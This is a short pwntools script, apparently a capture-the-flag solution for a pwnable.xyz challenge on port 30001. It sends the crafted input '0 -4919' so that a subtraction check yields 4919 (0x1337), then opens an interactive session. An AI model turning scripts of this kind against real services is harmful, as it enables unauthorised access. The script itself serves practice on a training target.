#0-(-4919)=4919
from pwn import *
s=remote("svc.pwnable.xyz",30001)
s.recv(1024)
s.send("0 -4919\n")
s.interactive()
s.close()